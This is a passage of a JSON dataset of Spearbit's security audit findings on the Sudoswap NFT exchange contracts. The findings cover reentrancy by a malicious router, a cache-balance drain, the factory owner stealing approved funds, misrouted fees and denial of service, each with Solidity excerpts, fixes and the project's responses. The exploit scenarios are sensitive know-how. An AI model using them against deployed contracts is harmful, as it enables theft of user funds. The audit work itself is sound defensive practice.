      "content": "## Security Report\n\n## Severity\n**Low Risk**\n\n## Context\nLSSVMPairETH.sol#L133-139\n\n## Description\nThe contract `LSSVMPairETH` contains an open `fallback()` function. The `fallback()` is most likely necessary because the proxy adds calldata and the `receive()` function, therefore not receiving the ETH. However, without additional checks, any function call to an ETH Pair will succeed. This could result in unforeseen scenarios which hackers could potentially exploit.\n\n```solidity\nfallback() external payable {\n    emit TokenDeposited(msg.value);\n}\n```\n\n## Recommendation\nSpearbit recommends adapting the `fallback()` function in the following way to ameliorate this risk:\n\n```solidity\nfallback() external payable {\n    require(msg.data.length == _immutableParamsLength()); // only allow calls without function selector\n    emit TokenDeposited(msg.value);\n}\n```\n\n## Additional Notes\n- **Sudoswap:** Addressed here.\n- **Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6783",
      "title": "Add check for numItems == 0",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `LinearCurve.sol#L38-58`\n- `ExponentialCurve.sol#L45-65`\n- `LinearCurve.sol#L100-120`\n- `ExponentialCurve.sol#L108-129`\n\n## Description\nFunctions `getBuyInfo()` and `getSellInfo()` in `LinearCurve.sol` check that `numItems != 0`. However, the same `getBuyInfo()` and `getSellInfo()` functions in `ExponentialCurve.sol` do not perform this check.\n\n```solidity\ncontract LinearCurve is ICurve, CurveErrorCodes {\n    function getBuyInfo(...) ... {\n        // We only calculate changes for buying 1 or more NFTs\n        if (numItems == 0) {\n            return (Error.INVALID_NUMITEMS, 0, 0, 0);\n        }\n        ...\n    }\n\n    function getSellInfo(...) ... {\n        // We only calculate changes for selling 1 or more NFTs\n        if (numItems == 0) {\n            return (Error.INVALID_NUMITEMS, 0, 0, 0);\n        }\n        ...\n    }\n}\n\ncontract ExponentialCurve is ICurve, CurveErrorCodes {\n    function getBuyInfo(...) ... {\n        // No check on numItems\n        uint256 deltaPowN = delta.fpow(numItems, FixedPointMathLib.WAD);\n        ...\n    }\n\n    function getSellInfo(...) ... {\n        // No check on numItems\n        uint256 invDelta = FixedPointMathLib.WAD.fdiv(delta, FixedPointMathLib.WAD);\n        ...\n    }\n}\n```\n\nIf the code remains unchanged, an erroneous situation may not be caught, and funds might be sent when selling 0 NFTs. Luckily, when `numItems == 0`, the result `outputValue` of the functions in `ExponentialCurve` is still 0, so there is no real issue. However, it is still important to fix this because a derived version of these functions might be used by future developers.\n\n## Recommendation\nSpearbit recommends adding a check for `numItems == 0` to `getBuyInfo()` and `getSellInfo()` of `ExponentialCurve.sol`.\n\n## Responses\n- **Sudoswap:** Addressed in branch here.\n- **Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6782",
      "title": "Swaps can be front run by Pair Owner to extract any proﬁt from slippage allowance",
      "impact": "LOW",
      "content": "## Security Advisory\n\n## Severity\nLow Risk\n\n## Context\n- `LSSVMPair.sol#L630`\n- `LSSVMPair.sol#L644`\n- `LSSVMPair.sol#L660`\n\n## Description\nIf the user adds a nonzero slippage allowance, the pair owner can front-run the swap to increase the fee/spot price and steal all of the slippage allowance. This basically makes sandwich attacks much easier and cheaper to execute for the pair owner.\n\n## Recommendation\nSpearbit recommends that Sudoswap add a time delay of a few hours between the pair owner submitting a new price/fee/delta and the execution of such new changes coming into effect. If this is not ideal for Sudoswap, Spearbit alternatively recommends disallowing the change of these parameters and requiring the pair owner to deploy a new pair instead.\n\n## Responses\n**Sudoswap:** Acknowledged, but no changes have been made to the pricing model at this time. Still talking internally about what sort of time delay would be acceptable for a spot price change and how to change pricing logic if so.\n\n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6781",
      "title": "Error codes of Quote functions are unchecked",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `LSSVMPair.sol` Lines 389-431\n- `LSSVMRouter.sol`\n\n## Description\nThe error return values from functions `getBuyNFTQuote()` and `getSellNFTQuote()` are not checked in contract `LSSVMRouter.sol`, whereas other functions in contract `LSSVMPair.sol` do check for `error==CurveErrorCodes.Err` or `OK`.\n\n```solidity\nabstract contract LSSVMPair is Ownable, ReentrancyGuard {\n    ...\n    function getBuyNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) {\n        ...\n        (error, ...) = bondingCurve().getBuyInfo(...);\n    }\n\n    function getSellNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) {\n        ...\n        (error, ...) = bondingCurve().getSellInfo(...);\n    }\n\n    function swapTokenForAnyNFTs(...) external payable virtual returns (uint256 inputAmount) {\n        ...\n        (error, ...) = _bondingCurve.getBuyInfo(...);\n        require(error == CurveErrorCodes.Error.OK, \"Bonding curve error\");\n        ...\n    }\n}\n```\n\nIn `LSSVMRouter.sol` at Line 526:\n```solidity\n(, , pairOutput, ) = swapList[i].pair.getSellNFTQuote(...);\n```\n\nThe following contract lines contain the same code snippet:\n- `LSSVMRouter.sol` Lines 360, 407, 450, 493, 627, 664\n```solidity\n(, , pairCost, ) = swapList[i].pair.getBuyNFTQuote(...);\n```\n\n**Note:** The current Curve contracts, which implement the `getBuyNFTQuote()` and `getSellNFTQuote()` functions, have a limited number of potential errors. However, future Curve contracts might add additional error codes.\n\n## Recommendation\nCheck the error code of functions `getBuyNFTQuote()` and `getSellNFTQuote()` in contract `LSSVMRouter.sol`.\n\n## Responses\n- **Sudoswap:** Addressed in this branch. `LSSVMRouter` now reverts if the error is not `Error.OK` for a normal swap, or it skips performing the swap during a robust swap operation.\n- **Spearbit:** Acknowledged.",
      "summary": "\nThis bug report is related to the contracts LSSVMPair.sol and LSSVMRouter.sol. The functions getBuyNFTQuote() and getSellNFTQuote() from LSSVMPair.sol are used in several functions in LSSVMRouter.sol, but the error return values from these functions are not checked in LSSVMRouter.sol, while other functions in LSSVMPair.sol do check for error==CurveErrorCodes.Error.OK. The current Curve contracts, which implement the getBuyNFTQuote() and getSellNFTQuote() functions, have a limited number of potential errors, but future Curve contracts may add additional error codes.\n\nThe recommendation is to check the error code of functions getBuyNFTQuote() and getSellNFTQuote() in contract LSSVMRouter.sol. This issue has been addressed in a branch, and the LSSVMRouter now reverts if the Error is not Error.OK for a normal swap, or it skips performing the swap during a robust swap operation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6780",
      "title": "With NFT pools the protocol fees end up in assetRecipient instead of_factory",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- LSSVMPair.sol: Lines 192-245\n- LSSVMPairERC20.sol: Lines 90-105\n- LSSVMPairETH.sol: Lines 53-66\n\n## Description\nAssume a scenario where an NFT pool with `assetRecipient` set has the received funds sent directly to the `assetRecipient`. Now, suppose a user executes the `swapTokenForSpecificNFTs()`. \n\nThe function `_validateTokenInput()` sends the required input funds, including fees, to the `assetRecipient`. The function `_payProtocolFee()` tries to send the fees to the `_factory`. However, this function attempts to do so from the pair contract. The pair contract does not have any funds because they have been sent directly to the `assetRecipient`. As a result, after this action, the `payProtocolFee()` lowers the fees to 0 and sends this number to the `_factory`, while fees end up at `assetRecipient` instead of at the `_factory`.\n\nThe fees then end up at `assetRecipient` instead of at the `_factory`.\n\n### Notes\n- The same issue occurs in `swapTokenForAnyNFTs()`.\n- This issue occurs with both ETH and ERC20 NFT pools, although their logic is slightly different.\n- This issue occurs both when `swapTokenForSpecificNFTs()` is called directly as well as indirectly via the `LSSVMRouter`.\n- Although the pool fees are 0 with NFT pools, the factory fee is still present.\n- Luckily, TRADE pools cannot have an `assetRecipient`, as this would also create issues.\n\n```solidity\nabstract contract LSSVMPair is Ownable, ReentrancyGuard {\n    ...\n    function swapTokenForSpecificNFTs(...) external payable virtual returns (uint256 inputAmount) {\n        ...\n        _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); // sends inputAmount to assetRecipient\n        _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds);\n        _refundTokenToSender(inputAmount);\n        _payProtocolFee(_factory, protocolFee);\n        ...\n    }\n}\n```\n\n```solidity\nabstract contract LSSVMPairERC20 is LSSVMPair {\n    ...\n    function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override {\n        ...\n        uint256 pairTokenBalance = _token.balanceOf(address(this));\n        if (protocolFee > pairTokenBalance) {\n            protocolFee = pairTokenBalance;\n        }\n        _token.safeTransfer(address(_factory), protocolFee); // tries to send from the Pair contract\n    }\n}\n```\n\n```solidity\nabstract contract LSSVMPairETH is LSSVMPair {\n    function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override {\n        ...\n        uint256 pairETHBalance = address(this).balance;\n        if (protocolFee > pairETHBalance) {\n            protocolFee = pairETHBalance;\n        }\n        payable(address(_factory)).safeTransferETH(protocolFee); // tries to send from the Pair contract\n    }\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to first be aware of the following:\n- In ETH NFT pools, ETH is first sent to the Pair contract, then to other parties.\n- In ERC20 NFT pools, ERC20 tokens are sent directly from the original caller to other parties. This means that when an `assetRecipient` is set, the ERC20 does not touch the pair.\n\nSecond, we recommend that Sudoswap change `swapTokenForSpecificNFTs()` as follows:\n\n```solidity\nfunction swapTokenForSpecificNFTs(...) external payable virtual returns (uint256 inputAmount) {\n    ...\n    - _validateTokenInput(inputAmount, isRouter, routerCaller, _factory);\n    + _validateTokenInput(inputAmount - protocolFee, isRouter, routerCaller, _factory);\n    ...\n    - _payProtocolFee(_factory, protocolFee);\n    + _payProtocolFeeByOriginalCaller(_factory, protocolFee, isRouter, routerCaller);\n    ...\n}\n```\n\nWe also recommend that Sudoswap perform the same update for `swapTokenForAnyNFTs()`.\n\nThird, we recommend creating a new `_payProtocolFeeByOriginalCaller()` in `LSSVMPairERC20()` that combines the functionality of `_payProtocolFee()` and `_validateTokenInput()`. This is due to the assumption that the function should also be able to retrieve the ERC20 tokens from the original caller.\n\nNote: `_payProtocolFeeByOriginalCaller` in `LSSVMPairETH()` can just do the same as `_payProtocolFee()`.\n\nLastly, it may be wise for Sudoswap to consider renaming `_payProtocolFee()` to `_payProtocolFeeFromPair()`, clarifying the difference.\n\nNote: The functionality of `_payProtocolFeeFromPair()` is still necessary for `routerSwapNFTsForToken()` and `swapNFTsForToken()` because in that case, the funds are indeed in the Pair.\n\n## Sudoswap\nAddressed in the branch here. Pulling tokens and taking the protocol fee is now done in the same step when swapping from tokens to NFTs, so there should always be tokens to send for the fee. The original `_payProtocolFee` function has been renamed `_payProtocolFeeFromPair` as suggested.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nSudoswap is a decentralized exchange that recently reported a bug in their code. The bug occurs when a user attempts to swap tokens for specific NFTs, and the function _validateTokenInput sends the required input funds, including fees, to the assetRecipient. This causes the fees to be sent to the assetRecipient instead of the _factory. The bug occurs with both ETH and ERC20 NFT pools, and it happens both when swapTokenForSpecificNFTs is called directly or indirectly via the LSSVMRouter. \n\nSpearbit, a software testing company, recommends that Sudoswap first be aware of the following: when ETH is used in NFT pools, ETH is first sent to the Pair contract, and then to other parties; when ERC20 is used in NFT pools, ERC20 tokens are sent directly from the original caller to other parties. This means that when an assetRecipient is set, the ERC20 does not touch the pair. \n\nSecond, Spearbit recommends that Sudoswap changes swapTokenForSpecificNFTs as such: the _validateTokenInput function should subtract the protocolFee from the inputAmount, and the _payProtocolFee function should be changed to _payProtocolFeeByOriginalCaller. The same update should be performed for swapTokenForAnyNFTs. \n\nThird, Spearbit recommends creating a new _payProtocolFeeByOriginalCaller in LSSVMPairERC20 that combines the functionality of _payProtocolFee and _validateTokenInput, as this function should also be able to retrieve the ERC20 tokens from the original caller. Lastly, Spearbit suggests that Sudoswap consider renaming _payProtocolFee to _payProtocolFeeFromPair, clarifying the difference. \n\nSudoswap has addressed the bug in the branch and has renamed the _payProtocolFee function as suggested. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6779",
      "title": "getAllHeldIds() ofLSSVMPairMissingEnumerable is vulnerable to a denial of service attack",
      "impact": "MEDIUM",
      "content": "## Medium Risk Assessment\n\n## Context\n- **Files:** `LSSVMPairMissingEnumerable.sol#L90-97`, `LSSVMPair.sol#L125`\n\n## Description\nThe contract `LSSVMPairMissingEnumerable` attempts to compensate for NFT contracts that do not implement `ERC721Enumerable`. However, this compensation is not universally applicable. For instance, if `transferFrom()` is utilized to send an NFT from the same collection to the Pair, the callback on `ERC721Received()` will not be triggered. Consequently, the `idSet` administration of `LSSVMPairMissingEnumerable` will not be updated. \n\nThis discrepancy means that `nft().balanceOf(address(this));` may differ from the elements in `idSet`. If an actor inadvertently, or deliberately, uses `transferFrom()` to send additional NFTs to the Pair, the `getAllHeldIds()` function will fail since `idSet.at(i)` for unregistered NFTs will result in an error. This could facilitate a griefing attack.\n\n### `getAllHeldIds()` in `LSSVMPairMissingEnumerable`\n```solidity\nfunction getAllHeldIds() external view override returns (uint256[] memory) {\n    uint256 numNFTs = nft().balanceOf(address(this)); // returns the registered + unregistered NFTs\n    uint256[] memory ids = new uint256[](numNFTs);\n    for (uint256 i; i < numNFTs; i++) {\n        ids[i] = idSet.at(i); // will fail at the unregistered NFTs\n    }\n    return ids;\n}\n```\n\nThe checks performed with `_nft.balanceOf()` may not be accurate in conjunction with `LSSVMPairMissingEnumerable`. The risk is low because any additional NFTs causing later calls to `_sendAnyNFTsToRecipient()` and `_sendSpecificNFTsToRecipient()` will fail. Nevertheless, this may complicate troubleshooting.\n\n### `swapTokenForAnyNFTs(...)`\n```solidity\nfunction swapTokenForAnyNFTs(...) {\n    ...\n    require((numNFTs > 0) && (numNFTs <= _nft.balanceOf(address(this))), \"Ask for > 0 and <= balanceOf NFTs\");\n    ...\n    _sendAnyNFTsToRecipient(_nft, nftRecipient, numNFTs); // could fail\n    ...\n}\n```\n\n### `swapTokenForSpecificNFTs(...)`\n```solidity\nfunction swapTokenForSpecificNFTs(...) {\n    ...\n    require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))), \"Must ask for > 0 and <= balanceOf NFTs\");\n    ...\n    _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds); // could fail\n    ...\n}\n```\n\n**Note:** The error message `< balanceOf NFTs` is misleading.\n\n## Recommendation\nSpearbit recommends that Sudoswap utilize `idSet.length()` to determine the number of NFTs, by modifying the code as shown below:\n\n```diff\n- uint256 numNFTs = nft().balanceOf(address(this));\n+ uint256 numNFTs = idSet.length();\n```\n\nTo access `idSet.length()` from `LSSVMPair`, an extra function is necessary in `LSSVMPairMissingEnumerable.sol` and `LSSVMPairEnumerable.sol`. Additionally, Spearbit advises correcting the error string in `swapTokenForSpecificNFTs`.\n\n### Sudoswap\nAddressed in this branch [here](#). The `idSet` size is now utilized instead of `NFT balanceOf`.\n\n### Spearbit\nAcknowledged.",
      "summary": "\nA denial of service attack has been identified with a medium risk severity. This attack involves the contract LSSVMPairMissingEnumerable, which attempts to compensate for Non-Fungible Tokens (NFTs) that do not have ERC721Enumerable implemented. It is possible to use transferFrom() to send an NFT from the same collection to the Pair, in which case the callback on-ERC721Received() will not be triggered and the idSet administration of LSSVMPairMissingEnumerable will not be updated. This means that nft().balanceOf(address(this)) can be different from the elements in idSet. \n\nAssuming an actor accidentally, or on purpose, uses transferFrom() to send additional NFTs to the Pair, getAllHeldIds() will fail as idSet.at(i) for unregistered NFTs will fail. This can be used in a grieﬁng attack. Additionally, the checks performed by _nft.balanceOf() might not be accurate in combination with LSSVMPairMissingEnumerable. \n\nSpearbit has recommended Sudoswap to use idSet.length() in order to determine the number of NFTs by changing the code. They also suggest to fix the error string in swapTokenForSpecificNFTs. Sudoswap has addressed the issue in a branch and idSet size is now used instead of NFT balanceOf.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6778",
      "title": "Malicious Router can steal NFTs via Re-Entrancy attack",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n### Context\n- **Contracts:** `LSSVMPair.sol`, `LSSVMPairERC20.sol`\n\n### Description\nIf the factory owner approves a malicious `_router`, it is possible for the malicious router to call functions like `swapTokenForAnyNFTs()` and set `is-Router` to true. Once that function reaches `router.pairTransferERC20From()` in `validateTokenInput()`, they can re-enter the pair from the router and call `swapTokenForAnyNFTs()` again.\n\nThis second time, the function reaches `router.pairTransferERC20From()`, allowing the malicious router to execute a token transfer so that the `require` of `validateTokenInput` is satisfied when the context returns to the pair. When the context returns from the reentrant call back to the original call, the `require` of `validateTokenInput` would still pass because the balance was cached before the reentrant call. Therefore, an attacker will receive 2 NFTs by sending tokens only once.\n\n### Recommendation\nSpearbit recommends Sudoswap to implement reentrancy modifiers (see finding \"Add Reentrancy Guards\" in the \"Low Risk\" section of this report). Sudoswap should also consider checking if the NFT balance before and after `router.pairTransferERC20From()` is the same. Finally, we recommend making sure the following contracts and addresses are trusted:\n- The NFT contract\n- The ERC-20 tokens\n- The `assetRecipient`\n- The bonding curve\n- The factory\n- The factory owner\n- The `protocolFeeRecipient`\n\n### Sudoswap\nThe immediate issue is addressed in this branch. We now validate NFT balances after the `router.pairTransferERC20From` call to mitigate re-entrant balance changes by a malicious router. The broader issue of the cache function being exploitable is addressed in the GitHub Issue about simplifying the connection between the pair and the router.\n\n### Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about a vulnerability in the LSSVMPair.sol and LSSVMPairERC20.sol smart contracts. If a malicious router is approved by the factory owner, they can call functions like swapTokenForAnyNFTs() and set is-Router to true. This could allow the malicious router to execute a token transfer so that the require of _validateTokenInput is satisﬁed when the context returns to the pair, allowing them to receive 2 NFTs by sending tokens only once. \n\nSudoswap, the developers of the contracts, have addressed the immediate issue by validating NFT balances after the router.pairTransferERC20From call to mitigate re-entrant balance changes by a malicious router, and they are also addressing the broader issue of the cache function being exploitable in the GitHub Issue about simplifying the connection between the pair and the router. In order to protect against this vulnerability, Spearbit recommends Sudoswap to implement reentrancy modiﬁers, check if the NFT balance before and after router.pairTransferERC20From() is the same, and make sure the following contracts and addresses are trusted: the NFT contract, the ERC-20 tokens, the assetRecipient , the bonding curve, the factory, the factory owner, and the protocolFeeRecipient . \n\nSudoswap has acknowledged the recommendation.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6777",
      "title": "Malicious Router can exploit cacheAssetRecipientNFTBalance to drain pair funds",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- **File**: LSSVMPair.sol\n- **Lines**: 371-379, 318-366\n\n## Description\nA malicious router could be whitelisted by an inattentive or a malicious factory owner and drain pair funds in the following exploit scenario:\n\n1. Call the cache function. Suppose that the current balance is 10, so it gets cached.\n2. Sell 5 NFTs to the pair and get paid using `swapNFTsForToken`. Total balance is now 15 but the cached balance is still 10.\n3. Call `routerSwapNFTsForToken`. This function will compute `total_balance - cached_balance`, assume 5 NFTs have been sent to it and pay the user. However, no new NFTs have been sent and it already paid for them in Step 2.\n\n## Recommendation\nSpearbit recommends Sudoswap to implement reentrancy modifiers (see finding \"Add Reentrancy Guards\" in the \"Low Risk\" section of this report). We also suggest implementing recommendations in the \"Simplify the Connection between Pair and Router\" found in the \"Gas Optimization\" section of this report to reduce attack surface.\n\n## Status\n- **Sudoswap**: Removed this flow through the implementation of the recommendation here.\n- **Spearbit**: Acknowledged.",
      "summary": "\nThis bug report is about the risk of a malicious router being whitelisted by an inattentive or malicious factory owner and draining pair funds. The exploit scenario involves a malicious router calling the cache function and then selling 5 NFTs to the pair and getting paid using swapNFTsForToken. This causes the total balance to increase but the cached balance remains the same. The malicious router then calls routerSwapNFTsForToken and gets paid for the NFTs even though they were already paid for in the previous step. \n\nTo mitigate this risk, Spearbit recommends that Sudoswap implement reentrancy modifiers and simplify the connection between the pair and the router to reduce attack surface. Sudoswap has implemented the recommendation and Spearbit has acknowledged it.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6776",
      "title": "Malicious assetRecipient could get an unfair amount of tokens",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`LSSVMRouter.sol#L754-789`\n\n## Description\nThe function `_swapNFTsForToken()` of `LSSVMRouter` calls `safeTransferFrom()`, which then calls `ERC721Received` of `assetRecipient`. A malicious `assetRecipient` could manipulate its NFT balance by buying additional NFTs via the Pair and sending or selling them back to the Pair, enabling the malicious actor to obtain an unfair amount of tokens via `routerSwapNFTsForToken()`.\n\n```solidity\nfunction _swapNFTsForToken(...) {\n    ...\n    swapList[i].pair.cacheAssetRecipientNFTBalance();\n    ...\n    for (uint256 j = 0; j < swapList[i].nftIds.length; j++) {\n        nft.safeTransferFrom(msg.sender, assetRecipient, swapList[i].nftIds[j]); // call to onERC721Received of assetRecipient\n    }\n    ...\n    outputAmount += swapList[i].pair.routerSwapNFTsForToken(tokenRecipient); // checks the token balance of assetRecipient\n    ...\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to implement re-entrancy modifiers (see finding \"Add Reentrancy Guards\" in the \"Low Risk\" section of this report). We also recommend that Sudoswap implements the recommendation \"Simplify the Connection Between Pair and Router\" in the \"Gas Optimizations\" section of this report to reduce the attack surface. Finally, we recommend that Sudoswap make sure the `assetRecipient` is trusted.\n\n**Sudoswap:** We’ve also accepted the recommendation to simplify the connection between the Router and the Pair, provided fix is in the issue here.\n\n**Spearbit:** Acknowledged.",
      "summary": "\nThis bug report describes a potential attack vector on the LSSVMRouter.sol#L754-789 function _swapNFTsForToken(). The malicious actor could manipulate the NFT balance by buying additional NFTs, sending or selling them back to the Pair and obtaining an unfair amount of tokens via routerSwapNFTsForToken(). To prevent this, Spearbit recommends that Sudoswap implements re-entrancy modifiers, simplifies the connection between the Pair and Router and makes sure the assetRecipient is trusted. Sudoswap has accepted the recommendation to simplify the connection between the Router and the Pair.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6775",
      "title": "Missing check in the number of Received Tokens when tokens are transferred directly",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- **Location**: `LSSVM\\contracts`, `LSSVMPairERC20.sol#L41-78`\n\n## Description\nWithin the function `_validateTokenInput()` of `LSSVMPairERC20`, two methods exist to transfer tokens. In the first method, via `router.pairTransferERC20From()`, a check is performed on the number of received tokens. In the second method, no checks are done.\n\nRecent hacks (e.g., Qubit finance) have successfully exploited `safeTransferFrom()` functions which did not revert nor transfer tokens. Additionally, with malicious or re-balancing tokens, the number of transferred tokens might be different from the amount requested to be transferred.\n\n```solidity\nfunction _validateTokenInput(...) ... {\n    ...\n    if (isRouter) {\n        // Call router to transfer tokens from user\n        uint256 beforeBalance = _token.balanceOf(_assetRecipient);\n        router.pairTransferERC20From(...)\n        // Verify token transfer (protect pair against malicious router)\n        require(_token.balanceOf(_assetRecipient) - beforeBalance == inputAmount, \"ERC20 not transferred in\");\n    } else {\n        // Transfer tokens directly\n        _token.safeTransferFrom(msg.sender, _assetRecipient, inputAmount);\n    }\n}\n```\n\n## Recommendation\nSpearbit recommends Sudoswap to verify the number of tokens received when these are transferred directly.\n\n## Comments\n- **Sudoswap**: Risks acknowledged but no changes at this time. Pair creators would have to willingly deploy an NFT/Token pair for a token using non-standard ERC20 token behavior to be at risk.\n- **Spearbit**: Acknowledged.",
      "summary": "\nA bug report has been found in the LSSVM\\contracts,LSSVMPairERC20.sol#L41-78 code. It is a medium risk bug and is related to the function _validateTokenInput(). This function has two methods to transfer tokens, one with a check on the number of received tokens and the other without a check. This could be exploited by malicious or rebalancing tokens, as seen in the Qubit Finance hack. Spearbit recommends Sudoswap to verify the number of tokens received when these are transferred directly. Sudoswap has acknowledged the risk but no changes are planned at this time. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6774",
      "title": "Factory Owner can steal user funds approved to the Router",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- **Files:** LSSVMPair.sol#L687-695, LSSVMRouter.sol#L574\n\n## Description\nA pair owner can make arbitrary calls to any contract that has been approved by the factory owner. The code in the factory intends to prevent router contracts from being approved for calls because router contracts can have access to user funds. An example includes the `pairTransferERC20From()` function, which can be used to steal funds from any account that has given it approval.\n\nThe router contracts can nevertheless be whitelisted by first being removed as a router and then being whitelisted. This way, anyone can deploy a pair and use the `call` function to steal user funds.\n\n## Recommendation\nSpearbit recommends that Sudoswap consider changing the architecture such that the router simply sends the NFTs to the pair when it calls the swap function. If you want to remove the trust from the router, make the pair store reserve balances and check tokens received against it.\n\n## Sudoswap\nThe immediate issue of adding/removing routers is addressed in this branch here. Every time a new router is added or removed, we only toggle the allowed flag, while `wasEverAllowed` is always true. `LSSVMPair.call()` now checks if we’ve ever approved a router. The broader issue of the factory owner being able to potentially steal pool funds is acknowledged, with other specific vectors mentioned in the audit addressed in other branches.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report outlines a vulnerability in the LSSVMPair and LSSVMRouter contracts. The code in the factory intends to prevent router contracts from being approved for calls, as they can have access to user funds. However, a pair owner can still make arbitrary calls to any contract that has been approved by the factory owner, allowing them to potentially steal user funds. \n\nSudoswap has addressed the immediate issue of adding/removing routers, however, the broader issue of the factory owner being able to potentially steal pool funds remains. Spearbit recommends that Sudoswap consider changing the architecture such that the router sends the NFTs to the pair when it calls the swap function, and that the pair should store reserve balances and check tokens received against it. Spearbit's recommendation has been acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Max Goodman",
        "Mudit Gupta",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6773",
      "title": "Clones with malicious extradata are also considered valid clones",
      "impact": "HIGH",
